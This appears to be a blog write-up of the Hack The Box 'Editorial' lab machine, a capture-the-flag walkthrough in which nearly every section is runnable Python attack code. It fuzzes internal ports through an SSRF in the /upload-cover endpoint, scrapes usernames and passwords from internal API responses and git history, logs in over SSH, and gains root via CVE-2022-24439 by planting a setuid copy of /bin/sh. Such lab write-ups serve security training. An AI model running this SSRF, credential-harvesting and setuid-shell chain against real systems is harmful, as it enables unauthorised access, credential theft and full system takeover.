+++
authors = ["Shengtuo Hu"]
title = "Editorial"
description = "Hack The Box - Editorial"
date = 2025-08-19T22:41:36-07:00
[taxonomies]
tags = ["HackTheBox"]
[extra]
toc = true
toc_sidebar = true
+++

<https://www.hackthebox.com/machines/editorial>

## Port Scanning

> Remember to add a reference in `/etc/hosts` for `editorial.htb`

```bash
sudo nmap -vv -sC -sV -T4 -A editorial.htb
```

```python
from common import scan_ports

scan_ports("editorial.htb")
```

## Exploit `/upload-cover` API

- Endpoint: `http://editorial.htb/upload-cover`

```python
import asyncio
from typing import Optional

import aiohttp
from tqdm.notebook import tqdm

BASE_URL = "http://editorial.htb"
API_URL = f"{BASE_URL}/upload-cover"
FAILURE_IMAGE_PATH = (
    "/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg"
)
MAX_CONCURRENT_REQUESTS = 40
LOCALHOST_URL_FMT = "http://127.0.0.1:{:d}"


async def ssrf_request(
    session: aiohttp.ClientSession, url: str
) -> Optional[str]:
    data = aiohttp.FormData()
    data.add_field("bookurl", url)
    data.add_field(
        "bookfile",
        value="",
        content_type="application/octet-stream",
        filename="",
    )

    try:
        response = await session.post(
            API_URL,
            data=data,
            raise_for_status=True,
            timeout=aiohttp.ClientTimeout(total=10),
        )
    except aiohttp.ServerConnectionError as err:
        return None
    except aiohttp.ClientError as err:
        print(f"Error: {err=}, {url=}")
        return None
    except asyncio.TimeoutError:
        print(f"Request timed out: {url=}")
        return None

    return await response.text()


async def check_port(
    session: aiohttp.ClientSession,
    port: int,
    sem: asyncio.Semaphore,
) -> Optional[tuple[int, str]]:
    bookurl = LOCALHOST_URL_FMT.format(port)
    async with sem:
        image_path = await ssrf_request(session, bookurl)
        if image_path is None:
            return None
        image_path = image_path.strip()
        return (port, image_path) if image_path != FAILURE_IMAGE_PATH else None


async def fuzz_ports() -> list[int]:
    ports = []
    sem = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)
    async with aiohttp.ClientSession() as session:
        # NOTE: should iterate over all ports. Since we know `5000` is the answer,
        # we can reduce the range
        tasks = [check_port(session, port, sem) for port in range(4500, 5001)]

        try:
            for coro in tqdm(asyncio.as_completed(tasks), total=len(tasks)):
                result = await coro
                if result is None:
                    continue
                port, _ = result
                print(f"Found open port: {port}")
                ports.append(port)
        except asyncio.CancelledError:
            print("Cancelled")
        except KeyboardInterrupt:
            print("Interrupted by user")

    print(f"Open ports: {ports}")

    return ports


ports = await fuzz_ports()
```

## Explore Locally Exposed Ports

```python
import json
import pprint
from typing import Optional

import aiohttp


async def fetch_image(
    session: aiohttp.ClientSession, image_path: str
) -> Optional[str]:
    if not image_path.startswith("/"):
        image_path = "/" + image_path
    try:
        image_url = f"{BASE_URL}{image_path}"
        async with session.get(image_url, raise_for_status=True) as response:
            return await response.text()
    except Exception as e:
        print(f"Error fetching image: {e}")
        return None


async def fetch_content(
    session: aiohttp.ClientSession, port: int, endpoint: str = ""
) -> Optional[str]:
    bookurl = LOCALHOST_URL_FMT.format(port) + endpoint
    image_path = await ssrf_request(session, bookurl)
    if image_path is None:
        return None
    if not image_path.startswith("/"):
        image_path = "/" + image_path
    print(f"GET {bookurl}: {image_path}")

    return await fetch_image(session, image_path)


assert len(ports) == 1
port = ports[0]

async with aiohttp.ClientSession() as session:
    content = await fetch_content(session, port)
    api_docs: dict = json.loads(content) if content else {}

pprint.pprint(api_docs)
```

```python
import pprint
import re

CONTENT_NOT_FOUND = "404 Not Found"
USERNAME_PASSWORD_PATTERN = re.compile(
    r"Username: (?P<username>\w+)\\nPassword: (?P<password>[\w!@]+)\\n"
)

endpoints = []
for category, entries in api_docs.items():
    for entry in entries:
        for api_name, api_doc in entry.items():
            endpoints.append(api_doc["endpoint"])
pprint.pprint(endpoints)

# Extract username and password
username = None
password = None
async with aiohttp.ClientSession() as session:
    for endpoint in endpoints:
        content = await fetch_content(session, port, endpoint=endpoint)
        if content is not None and CONTENT_NOT_FOUND not in content:
            if match := USERNAME_PASSWORD_PATTERN.search(content):
                payload = json.loads(content) if content else {}
                print(f"Content from {endpoint}:")
                # pprint.pprint(payload)
                print(payload)
                username = match.group("username")
                password = match.group("password")
                print(f"Username: {username}")
                print(f"Password: {password}")
if username is None or password is None:
    raise ValueError("Failed to extract username and password.")
credentials = {username: password}
```

## Shell as `dev`

```python
import asyncssh

if "dev" not in credentials:
    raise ValueError("No credentials for user 'dev' found.")

username = "dev"
password = credentials[username]

async with asyncssh.connect(
    "editorial.htb", username=username, password=password
) as conn:
    # Check user
    result = await conn.run("id", check=True)
    print(result.stdout, end="")

    # Obtain the flag
    result = await conn.run("cat user.txt", check=True)
    if result.stdout is not None:
        dev_flag = result.stdout.strip()
        print(f"Dev flag: {dev_flag}")

    # Check commit history within `/home/dev/apps` directory
    result = await conn.run(
        'cd /home/dev/apps && git --no-pager log -p -G "Username: .*Password: .*"',
        check=True,
    )
    if result.stdout is None:
        raise ValueError("Failed to retrieve commit history.")
    commit_history = result.stdout.strip()
    if isinstance(commit_history, bytes):
        commit_history = commit_history.decode("utf-8")
    assert isinstance(commit_history, str)

    for match in USERNAME_PASSWORD_PATTERN.finditer(commit_history):
        username = match.group("username")
        password = match.group("password")

        if username in credentials:
            if credentials[username] == password:
                continue  # Skip already known credentials
            else:
                print(
                    f"Found different credentials for {username}: {password}"
                )
        else:
            credentials[username] = password
            print(
                f"Username: {match.group('username')}, Password: {match.group('password')}"
            )
```

## Shell as `prod`

```python
if "prod" not in credentials:
    raise ValueError("No credentials for user 'prod' found.")

username = "prod"
password = credentials[username]

async with asyncssh.connect(
    "editorial.htb", username=username, password=password
) as conn:
    # Check user
    result = await conn.run("id", check=True)
    print(result.stdout, end="")

    # Check privilege
    result = await conn.run(f"echo {password} | sudo -S -l", check=True)
    print(result.stdout, end="")
```

## Shell as `root`

Exploit `CVE-2022-24439` to get `root` access

```python
if "prod" not in credentials:
    raise ValueError("No credentials for user 'prod' found.")

username = "prod"
password = credentials[username]

ROOT_SHELL_PATH = "/home/prod/root_sh"
EXPLOIT_SCRIPT = f"""
#!/bin/bash

cp /bin/sh {ROOT_SHELL_PATH}
chown root:root {ROOT_SHELL_PATH}
chmod 6777 {ROOT_SHELL_PATH}
""".strip()
EXPLOIT_SCRIPT_PATH = "/home/prod/exploit.sh"

async with asyncssh.connect(
    "editorial.htb", username=username, password=password
) as conn:
    # Check user
    result = await conn.run("id", check=True)
    print(result.stdout, end="")

    # Create the exploit script
    result = await conn.run(
        f"echo '{EXPLOIT_SCRIPT}' > {EXPLOIT_SCRIPT_PATH}", check=True
    )
    print(result.stdout, end="")

    # Make the exploit script executable
    result = await conn.run(f"chmod +x {EXPLOIT_SCRIPT_PATH}", check=True)
    print(result.stdout, end="")

    # Execute the exploit
    result = await conn.run(
        f"echo {password} | sudo -S /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c {EXPLOIT_SCRIPT_PATH}'"
    )
    print(result.stdout, end="")
    print(result.stderr, end="")

    # Obtain the shell
    result = await conn.run(
        f"{ROOT_SHELL_PATH} -p -c 'id' && {ROOT_SHELL_PATH} -p -c 'cat /root/root.txt'",
        check=True,
    )
    print(result.stdout, end="")
```

## References

- [HTB: Editorial | 0xdf hacks stuff](https://0xdf.gitlab.io/2024/10/19/htb-editorial.html)
- [Remote Code Execution (RCE) in gitpython | CVE-2022-24439 | Snyk](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858)
